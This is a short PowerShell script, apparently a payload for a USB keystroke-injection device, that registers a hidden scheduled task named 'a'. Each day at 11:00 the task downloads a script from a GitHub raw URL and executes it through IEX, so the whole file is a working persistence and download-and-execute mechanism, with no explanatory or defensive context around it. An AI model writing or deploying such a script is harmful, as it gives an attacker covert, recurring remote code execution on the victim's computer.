$settings = New-ScheduledTaskSettingsSet -Hidden
$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument 'IEX (New-Object Net.WebClient).DownloadString("\"https://raw.githubusercontent.com/Luigit12/rubduck/master/command.ps1\"");'
$trigger = New-ScheduledTaskTrigger -Daily -At 11:00
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName 'a' -Settings $settings
